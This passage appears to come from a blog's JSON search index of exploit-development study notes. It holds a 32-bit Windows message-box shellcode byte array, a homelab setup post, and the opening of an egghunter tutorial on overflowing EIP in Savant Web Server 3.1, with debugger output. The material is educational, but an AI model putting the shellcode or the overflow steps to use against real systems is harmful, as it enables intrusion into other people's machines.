0xa7, 0x0, 0xa8, 0x8, 0xa8, 0x10, 0xa8, 0x18, 0xa8, 0x20, 0xa8, 0x28, 0xa8, 0x30, 0xa8, 0x38, 0xa8, 0x40, 0xa8, 0x48, 0xa8, 0x50, 0xa8, 0x58, 0xa8, 0x60, 0xa8, 0x68, 0xa8, 0x70, 0xa8, 0x70, 0xad, 0x78, 0xad, 0x80, 0xad, 0x88, 0xad, 0x90, 0xad, 0x98, 0xad, 0xa0, 0xad, 0xa8, 0xad, 0xb0, 0xad, 0xb8, 0xad, 0xc0, 0xad, 0xc8, 0xad, 0xd0, 0xad, 0xd8, 0xad, 0xe0, 0xad, 0xe8, 0xad, 0xf0, 0xad, 0xf8, 0xad, 0x0, 0xae, 0x8, 0xae, 0x10, 0xae, 0x18, 0xae, 0x20, 0xae, 0x28, 0xae, 0x30, 0xae, 0x38, 0xae, 0x40, 0xae, 0x48, 0xae, 0x50, 0xae, 0x58, 0xae, 0x60, 0xae, 0x68, 0xae, 0x70, 0xae, 0x78, 0xae, 0x80, 0xae, 0x88, 0xae, 0x90, 0xae, 0x98, 0xae, 0xa0, 0xae, 0xa8, 0xae, 0xb0, 0xae, 0xb8, 0xae, 0xc0, 0xae, 0xd0, 0xae, 0xd8, 0xae, 0xe0, 0xae, 0xe8, 0xae, 0xf0, 0xae, 0xf8, 0xae, 0x0, 0xaf, 0x8, 0xaf, 0x10, 0xaf, 0x18, 0xaf, 0x20, 0xaf, 0x28, 0xaf, 0x30, 0xaf, 0x38, 0xaf, 0x40, 0xaf, 0x48, 0xaf, 0x50, 0xaf, 0x58, 0xaf, 0x60, 0xaf, 0x68, 0xaf, 0x70, 0xaf, 0x78, 0xaf, 0x80, 0xaf, 0x88, 0xaf, 0x90, 0xaf, 0x98, 0xaf, 0xa0, 0xaf, 0xa8, 0xaf, 0xb0, 0xaf, 0xb8, 0xaf, 0xc0, 0xaf, 0xc8, 0xaf, 0xd0, 0xaf, 0xd8, 0xaf, 0xe0, 0xaf, 0xe8, 0xaf, 0xf0, 0xaf, 0xf8, 0xaf, 0x0, 0x10, 0x1, 0x0, 0xd8, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x8, 0xa0, 0x10, 0xa0, 0x18, 0xa0, 0x20, 0xa0, 0x28, 0xa0, 0xf8, 0xa9, 0x8, 0xaa, 0x18, 0xaa, 0x28, 0xaa, 0x38, 0xaa, 0x48, 0xaa, 0x58, 0xaa, 0x68, 0xaa, 0x78, 0xaa, 0x88, 0xaa, 0x98, 0xaa, 0xa8, 0xaa, 0xb8, 0xaa, 0xc8, 0xaa, 0xd8, 0xaa, 0xe8, 0xaa, 0xf8, 0xaa, 0x8, 0xab, 0x18, 0xab, 0x28, 0xab, 0x38, 0xab, 0x48, 0xab, 0x58, 0xab, 0x68, 0xab, 0x78, 0xab, 0x88, 0xab, 0x98, 0xab, 0xa8, 0xab, 0xb8, 0xab, 0xc8, 0xab, 0xd8, 0xab, 0xe8, 0xab, 0xf8, 0xab, 0x8, 0xac, 0x18, 0xac, 0x28, 0xac, 0x38, 0xac, 0x48, 0xac, 0x58, 0xac, 0x68, 0xac, 0x78, 0xac, 0x88, 0xac, 0x98, 0xac, 0xa8, 0xac, 0xb8, 0xac, 0xc8, 0xac, 0xd8, 0xac, 0xe8, 0xac, 0xf8, 0xac, 0x8, 0xad, 0x18, 0xad, 0x28, 0xad, 0x38, 0xad, 0x48, 0xad, 0x58, 0xad, 0x68, 0xad, 0x78, 0xad, 0x88, 0xad, 0x98, 0xad, 0xa8, 0xad, 0xb8, 0xad, 0xc8, 0xad, 0xd8, 0xad, 0xe8, 0xad, 0xf8, 0xad, 0x8, 0xae, 0x18, 0xae, 0x28, 0xae, 0x38, 0xae, 0x48, 0xae, 0x58, 0xae, 0x68, 0xae, 0x78, 0xae, 0x88, 0xae, 0x98, 0xae, 0xa8, 0xae, 0xb8, 0xae, 0xc8, 0xae, 0xd8, 0xae, 0xe8, 0xae, 0xf8, 0xae, 0x8, 0xaf, 0x18, 0xaf, 0x28, 0xaf, 0x38, 0xaf, 0x48, 0xaf, 0x58, 0xaf, 0x68, 0xaf, 0x78, 0xaf, 0x88, 0xaf, 0x98, 0xaf, 0xa8, 0xaf, 0xb8, 0xaf, 0xc8, 0xaf, 0xd8, 0xaf, 0xe8, 0xaf, 0xf8, 0xaf, 0x0, 0x0, 0x0, 0x20, 0x1, 0x0, 0x10, 0x1, 0x0, 0x0, 0x8, 0xa0, 0x18, 0xa0, 0x28, 0xa0, 0x38, 0xa0, 0x48, 0xa0, 0x58, 0xa0, 0x68, 0xa0, 0x78, 0xa0, 0x88, 0xa0, 0x98, 0xa0, 0xa8, 0xa0, 0xb8, 0xa0, 0xc8, 0xa0, 0xd8, 0xa0, 0xe8, 0xa0, 0xf8, 0xa0, 0x8, 0xa1, 0x18, 0xa1, 0x28, 0xa1, 0x38, 0xa1, 0x48, 0xa1, 0x58, 0xa1, 0x68, 0xa1, 0x78, 0xa1, 0x88, 0xa1, 0x98, 0xa1, 0xa8, 0xa1, 0xb8, 0xa1, 0xc8, 0xa1, 0xd8, 0xa1, 0xe8, 0xa1, 0xf8, 0xa1, 0x8, 0xa2, 0x18, 0xa2, 0x28, 0xa2, 0x38, 0xa2, 0x48, 0xa2, 0x58, 0xa2, 0x68, 0xa2, 0x78, 0xa2, 0x88, 0xa2, 0x98, 0xa2, 0xa8, 0xa2, 0xb8, 0xa2, 0xc8, 0xa2, 0xd8, 0xa2, 0xe8, 0xa2, 0xf8, 0xa2, 0x8, 0xa3, 0x18, 0xa3, 0x28, 0xa3, 0x38, 0xa3, 0x48, 0xa3, 0x58, 0xa3, 0x68, 0xa3, 0x78, 0xa3, 0x88, 0xa3, 0x98, 0xa3, 0xa8, 0xa3, 0xb8, 0xa3, 0xc8, 0xa3, 0xd8, 0xa3, 0xe8, 0xa3, 0xf8, 0xa3, 0x8, 0xa4, 0x18, 0xa4, 0x28, 0xa4, 0x38, 0xa4, 0x48, 0xa4, 0x58, 0xa4, 0x68, 0xa4, 0x78, 0xa4, 0x88, 0xa4, 0x98, 0xa4, 0xa8, 0xa4, 0xb8, 0xa4, 0xc8, 0xa4, 0xd8, 0xa4, 0xe8, 0xa4, 0xf8, 0xa4, 0x8, 0xa5, 0x18, 0xa5, 0x28, 0xa5, 0x38, 0xa5, 0x48, 0xa5, 0x58, 0xa5, 0x68, 0xa5, 0x78, 0xa5, 0x88, 0xa5, 0x98, 0xa5, 0xa8, 0xa5, 0xb8, 0xa5, 0xc8, 0xa5, 0xd8, 0xa5, 0xe8, 0xa5, 0xf8, 0xa5, 0x8, 0xa6, 0x18, 0xa6, 0x28, 0xa6, 0x38, 0xa6, 0x48, 0xa6, 0x58, 0xa6, 0x68, 0xa6, 0x78, 0xa6, 0x88, 0xa6, 0x98, 0xa6, 0xa8, 0xa6, 0xb8, 0xa6, 0xc8, 0xa6, 0xd8, 0xa6, 0xe8, 0xa6, 0xf8, 0xa6, 0x8, 0xa7, 0x18, 0xa7, 0x28, 0xa7, 0x38, 0xa7, 0x48, 0xa7, 0x58, 0xa7, 0x68, 0xa7, 0x78, 0xa7, 0x88, 0xa7, 0x98, 0xa7, 0xa8, 0xa7, 0xb8, 0xa7, 0xc8, 0xa7, 0xd8, 0xa7, 0xe8, 0xa7, 0xf8, 0xa7, 0x8, 0xa8, 0x18, 0xa8, 0x28, 0xa8, 0x0, 0x0, 0x0, 0x30, 0x1, 0x0, 0x80, 0x1, 0x0, 0x0, 0x50, 0xa4, 0x60, 0xa4, 0x70, 0xa4, 0x80, 0xa4, 0x90, 0xa4, 0xa0, 0xa4, 0xb0, 0xa4, 0xc0, 0xa4, 0xd0, 0xa4, 0xe0, 0xa4, 0xf0, 0xa4, 0x0, 0xa5, 0x10, 0xa5, 0x20, 0xa5, 0x30, 0xa5, 0x40, 0xa5, 0x50, 0xa5, 0x60, 0xa5, 0x70, 0xa5, 0x80, 0xa5, 0x90, 0xa5, 0xa0, 0xa5, 0xb0, 0xa5, 0xc0, 0xa5, 0xd0, 0xa5, 0xe0, 0xa5, 0xf0, 0xa5, 0x0, 0xa6, 0x10, 0xa6, 0x20, 0xa6, 0x30, 0xa6, 0x40, 0xa6, 0x50, 0xa6, 0x60, 0xa6, 0x70, 0xa6, 0x80, 0xa6, 0x90, 0xa6, 0xa0, 0xa6, 0xb0, 0xa6, 0xc0, 0xa6, 0xd0, 0xa6, 0xe0, 0xa6, 0xf0, 0xa6, 0x0, 0xa7, 0x10, 0xa7, 0x20, 0xa7, 0x30, 0xa7, 0x40, 0xa7, 0x50, 0xa7, 0x60, 0xa7, 0x70, 0xa7, 0x80, 0xa7, 0x90, 0xa7, 0xa0, 0xa7, 0xb0, 0xa7, 0xc0, 0xa7, 0xd0, 0xa7, 0xe0, 0xa7, 0xf0, 0xa7, 0x0, 0xa8, 0x10, 0xa8, 0x20, 0xa8, 0x30, 0xa8, 0x40, 0xa8, 0x50, 0xa8, 0x60, 0xa8, 0x70, 0xa8, 0x80, 0xa8, 0x90, 0xa8, 0xa0, 0xa8, 0xb0, 0xa8, 0xc0, 0xa8, 0xd0, 0xa8, 0xe0, 0xa8, 0xf0, 0xa8, 0x0, 0xa9, 0x10, 0xa9, 0x20, 0xa9, 0x30, 0xa9, 0x40, 0xa9, 0x50, 0xa9, 0x60, 0xa9, 0x70, 0xa9, 0x80, 0xa9, 0x90, 0xa9, 0xa0, 0xa9, 0xb0, 0xa9, 0xc0, 0xa9, 0xd0, 0xa9, 0xe0, 0xa9, 0xf0, 0xa9, 0x0, 0xaa, 0x10, 0xaa, 0x20, 0xaa, 0x30, 0xaa, 0x40, 0xaa, 0x50, 0xaa, 0x60, 0xaa, 0x70, 0xaa, 0x80, 0xaa, 0x90, 0xaa, 0xa0, 0xaa, 0xb0, 0xaa, 0xc0, 0xaa, 0xd0, 0xaa, 0xe0, 0xaa, 0xf0, 0xaa, 0x0, 0xab, 0x10, 0xab, 0x20, 0xab, 0x30, 0xab, 0x40, 0xab, 0x50, 0xab, 0x60, 0xab, 0x70, 0xab, 0x80, 0xab, 0x90, 0xab, 0xa0, 0xab, 0xb0, 0xab, 0xc0, 0xab, 0xd0, 0xab, 0xe0, 0xab, 0xf0, 0xab, 0x0, 0xac, 0x10, 0xac, 0x20, 0xac, 0x30, 0xac, 0x40, 0xac, 0x50, 0xac, 0x60, 0xac, 0x70, 0xac, 0x80, 0xac, 0x90, 0xac, 0xa0, 0xac, 0xb0, 0xac, 0xc0, 0xac, 0xd0, 0xac, 0xe0, 0xac, 0xf0, 0xac, 0x0, 0xad, 0x10, 0xad, 0x20, 0xad, 0x30, 0xad, 0x40, 0xad, 0x50, 0xad, 0x60, 0xad, 0x70, 0xad, 0x80, 0xad, 0x90, 0xad, 0xa0, 0xad, 0xb0, 0xad, 0xc0, 0xad, 0xd0, 0xad, 0xe0, 0xad, 0xf0, 0xad, 0x0, 0xae, 0x10, 0xae, 0x20, 0xae, 0x30, 0xae, 0x40, 0xae, 0x50, 0xae, 0x60, 0xae, 0x70, 0xae, 0x80, 0xae, 0x90, 0xae, 0xa0, 0xae, 0xb0, 0xae, 0xc0, 0xae, 0xd0, 0xae, 0xe0, 0xae, 0xf0, 0xae, 0x0, 0xaf, 0x10, 0xaf, 0x20, 0xaf, 0x30, 0xaf, 0x40, 0xaf, 0x50, 0xaf, 0x60, 0xaf, 0x70, 0xaf, 0x80, 0xaf, 0x90, 0xaf, 0xa0, 0xaf, 0xb0, 0xaf, 0xc0, 0xaf, 0xd0, 0xaf, 0xe0, 0xaf, 0xf0, 0xaf, 0x0, 0x0, 0x0, 0x40, 0x1, 0x0, 0x5c, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x10, 0xa0, 0x20, 0xa0, 0x30, 0xa0, 0x40, 0xa0, 0x50, 0xa0, 0x60, 0xa0, 0x70, 0xa0, 0x80, 0xa0, 0x90, 0xa0, 0xa0, 0xa0, 0xb0, 0xa0, 0xc0, 0xa0, 0xd0, 0xa0, 0xe0, 0xa0, 0xf0, 0xa0, 0x0, 0xa1, 0x10, 0xa1, 0x20, 0xa1, 0x30, 0xa1, 0x40, 0xa1, 0x50, 0xa1, 0x60, 0xa1, 0x70, 0xa1, 0x80, 0xa1, 0x90, 0xa1, 0xa0, 0xa1, 0xb0, 0xa1, 0xc0, 0xa1, 0xd0, 0xa1, 0xe0, 0xa1, 0xf0, 0xa1, 0x0, 0xa2, 0x10, 0xa2, 0x20, 0xa2, 0x30, 0xa2, 0x40, 0xa2, 0x50, 0xa2, 0x60, 0xa2, 0x70, 0xa2, 0x80, 0xa2, 0x0, 0x0, 0x0, 0x60, 0x1, 0x0, 0x20, 0x0, 0x0, 0x0, 0xc0, 0xa7, 0xc8, 0xa7, 0xd0, 0xa7, 0xd8, 0xa7, 0x58, 0xa8, 0x70, 0xa8, 0x78, 0xa8, 0x0, 0xa9, 0x18, 0xa9, 0x20, 0xa9, 0x28, 0xa9, 0x30, 0xa9, 0x0, 0x90, 0x1, 0x0, 0x4c, 0x0, 0x0, 0x0, 0xd0, 0xa6, 0x18, 0xa7, 0x38, 0xa7, 0x58, 0xa7, 0x78, 0xa7, 0x98, 0xa7, 0xc8, 0xa7, 0xe0, 0xa7, 0xe8, 0xa7, 0xf0, 0xa7, 0x28, 0xa8, 0x30, 0xa8, 0x50, 0xa9, 0x58, 0xa9, 0x60, 0xa9, 0x68, 0xa9, 0x70, 0xa9, 0x78, 0xa9, 0x80, 0xa9, 0x88, 0xa9, 0x90, 0xa9, 0x98, 0xa9, 0xa8, 0xa9, 0xb0, 0xa9, 0xb8, 0xa9, 0xc0, 0xa9, 0xc8, 0xa9, 0xd0, 0xa9, 0xd8, 0xa9, 0xe0, 0xa9, 0x20, 0xab, 0x48, 0xab, 0x70, 0xab, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x61, 0x76, 0x65 }; 32-bit (32-bit) messagebox shellcode unsigned char shellcode32[] = { 0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2, 0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0xef, 0xce, 0xe0, 0x60, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89, 0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x44, 0x65, 0x76, 0x58, 0x68, 0x20, 0x4d, 0x61, 0x6c, 0x68, 0x52, 0x54, 0x4f, 0x3a, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x0b, 0x89, 0xe3, 0x68, 0x72, 0x21, 0x58, 0x20, 0x68, 0x72, 0x61, 0x74, 0x6f, 0x68, 0x20, 0x4f, 0x70, 0x65, 0x68, 0x54, 0x65, 0x61, 0x6d, 0x68, 0x52, 0x65, 0x64, 0x20, 0x68, 0x72, 0x6f, 0x6d, 0x20, 0x68, 0x48, 0x69, 0x20, 0x66, 0x31, 0xc9, 0x88, 0x4c, 0x24, 0x1a, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff, 0x55, 0x08 }; ","title":"Shellcodes for everything"},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/homelab/","summary":"\u003ch1 id=\"hardware--software-setup\"\u003eHardware / Software setup\u003c/h1\u003e\n\u003ch2 id=\"orange-pi-5-8gb-ram\"\u003eOrange Pi 5 8GB RAM\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eUbuntu OS for OrangePi (debian works strange with pihole and some other containers, have tested).\u003c/li\u003e\n\u003cli\u003eStatic IP address in LAN (192.168.0.2).\u003c/li\u003e\n\u003cli\u003eDocker containers:\n\u003cul\u003e\n\u003cli\u003eWireguard -\u0026gt; VPN easy to manage\u003c/li\u003e\n\u003cli\u003ePihole -\u0026gt; Act as DNS server\u003c/li\u003e\n\u003cli\u003eSyncthing -\u0026gt; Backup of courses, blog, etc\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"steps-to-deploy-homelab\"\u003eSteps to deploy homelab\u003c/h1\u003e\n\u003col\u003e\n\u003cli\u003eDisable CGNAT\u003c/li\u003e\n\u003cli\u003eEnable Port Forwarding from 0.0.0.0 WAN to Orange PI LAN IP (UDP port 51820)\u003c/li\u003e\n\u003cli\u003eAssign Orange PI LAN IP as main DNS\u003c/li\u003e\n\u003cli\u003eAssign Static IP to Orange Pi\u003c/li\u003e\n\u003cli\u003eEnable docker containers (\u003cstrong\u003eNote: User \u003ccode\u003edocker compose\u003c/code\u003e, not docker-compose. Install docker from official repo via curl, not apt\u003c/strong\u003e)\nRouter assigns 192.168.0.128 to 192.168.0.255 via DHCP\n192.168.0.2 to 192.168.0.127 are IP addresses for my personal lab devices.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1 id=\"proxmox\"\u003eProxmox\u003c/h1\u003e\n\u003ch2 id=\"steps-to-add-new-disk\"\u003eSteps to add new disk\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eYou would need to format the drive via the UI (Click on the Node \u0026gt; Disks \u0026gt; Select your disk \u0026gt; Initialize disk with GPT). Depending on what kind of storage you want to create with your disk, the next steps differ.  \n  \nIf you want to create a directory storage, you would simply navigate to Directory in the sidebar and then click \u0026#39;Create\u0026#39;. There you just supply the sdb disk and enter a name and a type of filesystem.  \nBe aware that Directory storage does not support many features offered by PVE such as Snapshots (you can check the capabilities of the different storage types in our documentation: [1]).  \n  \nYou could also create an LVM-thin storage, which provides more features than a simple directory storage (which is probably what you currently have on your existing disk with name local). For this, instead of going to Directory in the sidebar, you can navigate to LVM-thin, then click \u0026#39;Create Thinpool\u0026#39; . Then you just enter a name for your new pool and wait until the creation has finished. Your disk should then be ready to use. I would recommend for you to use this for now as LVM-thin offers more features and capabilities than simple Directory storage, while still being relatively simple to use for beginners.  \n  \n[1] [https://pve.proxmox.com/pve-docs/pve-admin-guide.html#_storage_types](https://pve.proxmox.com/pve-docs/pve-admin-guide.html#_storage_types)\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"steps-to-import-vm\"\u003eSteps to import VM\u003c/h2\u003e\n\u003ch3 id=\"qcow-format\"\u003eQCOW format\u003c/h3\u003e\n\u003cp\u003ePush via SCP qcow file in qcow folder:\u003c/p\u003e","tags":[],"text":"hardware / software setup orange pi 5 8gb ram ubuntu os for orangepi (debian works strange with pihole and some other containers, have tested). static ip address in lan (192.168.0.2). docker containers: wireguard -\u0026gt; vpn easy to manage pihole -\u0026gt; act as dns server syncthing -\u0026gt; backup of courses, blog, etc steps to deploy homelab disable cgnat enable port forwarding from 0.0.0.0 wan to orange pi lan ip (udp port 51820) assign orange pi lan ip as main dns assign static ip to orange pi enable docker containers (note: user docker compose, not docker-compose. install docker from official repo via curl, not apt) router assigns 192.168.0.128 to 192.168.0.255 via dhcp 192.168.0.2 to 192.168.0.127 are ip addresses for my personal lab devices. proxmox steps to add new disk you would need to format the drive via the ui (click on the node \u0026gt; disks \u0026gt; select your disk \u0026gt; initialize disk with gpt). depending on what kind of storage you want to create with your disk, the next steps differ. if you want to create a directory storage, you would simply navigate to directory in the sidebar and then click \u0026#39;create\u0026#39;. there you just supply the sdb disk and enter a name and a type of filesystem. be aware that directory storage does not support many features offered by pve such as snapshots (you can check the capabilities of the different storage types in our documentation: [1]). you could also create an lvm-thin storage, which provides more features than a simple directory storage (which is probably what you currently have on your existing disk with name local). for this, instead of going to directory in the sidebar, you can navigate to lvm-thin, then click \u0026#39;create thinpool\u0026#39; . then you just enter a name for your new pool and wait until the creation has finished. your disk should then be ready to use. i would recommend for you to use this for now as lvm-thin offers more features and capabilities than simple directory storage, while still being relatively simple to use for beginners. [1] [https://pve.proxmox.com/pve-docs/pve-admin-guide.html#_storage_types](https://pve.proxmox.com/pve-docs/pve-admin-guide.html#_storage_types) steps to import vm qcow format push via scp qcow file in qcow folder:\nscp /home/jaco/documents/osed-offline/vm/vm-osed-x86-01.qcow2 root@192.168.0.4:/var/lib/vz/template/qcow/osed.qcow2 import the disk to the previously created vm (create a vm without disk):\nqm importdisk \u0026lt;vm id\u0026gt; \u0026lt;qcow2 image\u0026gt; \u0026lt;storage name\u0026gt; qm importdisk 101 -f qcow2 osed.qcow2 vms_storage after importing, in the web console click on \u0026ldquo;edit\u0026rdquo; in the unused disk in the \u0026ldquo;hardware\u0026rdquo; section of the machine. click ok and the disk should setup for the machine. lastly, change boot order so it boots from the disk first.\n","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_egghunter_1/","summary":"\u003ch1 id=\"our-buffer-is-not-always-in-a-predictable-location\"\u003eOur buffer is not always in a predictable location\u003c/h1\u003e\n\u003cp\u003eNormally, in the base stack overflows, after we overwrite EIP we see that the ESP register points to our controlled buffer, which would store the shellcode. Then, we find a JMP ESP to jump to our shellcode.\nHowever, there are some scenarios in which our shellcode is not directly accessible via ESP, or in a predictable location in memory.\nSometimes, it is possible to store a payload \u003cstrong\u003esomewhere else in the address space of the process,\u003c/strong\u003e and point to such address by \u0026ldquo;searching\u0026rdquo; for our payload in the code.\nLet\u0026rsquo;s see how to do it.\nFirst, we have the Savant Web Server 3.1, which has a vulnerability that allows us overwriting EIP via a large HTTP GET buffer:\u003c/p\u003e","tags":[],"text":"our buffer is not always in a predictable location normally, in the base stack overflows, after we overwrite eip we see that the esp register points to our controlled buffer, which would store the shellcode. then, we find a jmp esp to jump to our shellcode. however, there are some scenarios in which our shellcode is not directly accessible via esp, or in a predictable location in memory. sometimes, it is possible to store a payload somewhere else in the address space of the process, and point to such address by \u0026ldquo;searching\u0026rdquo; for our payload in the code. let\u0026rsquo;s see how to do it. first, we have the savant web server 3.1, which has a vulnerability that allows us overwriting eip via a large http get buffer:\n0:011\u0026gt; g (c3c.18f0): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. eax=ffffffff ebx=01775868 ecx=e319c4c3 edx=00000000 esi=01775868 edi=0041703c eip=41414141 esp=02d2ea1c ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 41414141 ?? ???¡ we have managed to overwrite the eip. however, let\u0026rsquo;s inspect esp to see how much bytes do we have stored:\n0:004\u0026gt; dd esp l5 02d2ea1c 00414141 02d2ea74 0041703c 01775868 02d2ea2c 01775868 only three bytes have been available. the fourth byte is a null terminator, which means that our payload probably is stored as a string. therefore, we cannot put our shellcode as we would in a vanilla stack overflow. whenever we deal with a limited amount of space, we should try to increase the size of the buffer to see if that results in more space for our overflow.\nhowever, if the buffer size is increased, even by one byte, a different crash where we do not gain control over the instruction pointer happens:\n0:009\u0026gt; g (c98.664): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. *** warning: unable to verify checksum for c:\\savant\\savant.exe eax=41414141 ebx=01745868 ecx=005a0000 edx=005a0000 esi=01745868 edi=0041703c eip=0040c05f esp=04f6e6a8 ebp=04f6ea14 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 note that putting a big buffer always will make things go wrong! start by a little buffer and keep incrementing it.\nlet\u0026rsquo;s go back to the scenario where we control eip. let\u0026rsquo;s analyze if any register stores our payload, so we can maybe perform a jmp register operation. an example with ebx:\n0:004\u0026gt; dds ebx 00505868 00001910 0050586c 000003e8 00505870 00000000 none of the registers point to our buffer.\nthe next thing is to search in the stack frame if there is any pointer to our 